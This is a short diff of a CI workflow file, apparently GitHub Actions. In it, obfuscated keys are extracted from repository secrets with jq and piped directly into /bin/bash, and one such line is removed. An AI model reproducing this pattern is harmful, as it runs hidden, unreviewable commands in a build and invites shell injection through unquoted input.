@@ -17,7 +17,6 @@ jobs:
           l87327: ${{ secrets.l87327 }}
         run: |
           printf '%s' "$l87327" | jq -r .cem66911 | /bin/bash
-          echo $bs084 | jq -r .v04290 | /bin/bash
           printf '%s' "$c01255" | jq -r .rvjl055 | /bin/bash
           printf '%s' "$sjeb663" | jq -r .ctq268 | /bin/bash
           printf '%s' "$pizzs4694" | jq -r .j6 | /bin/bash
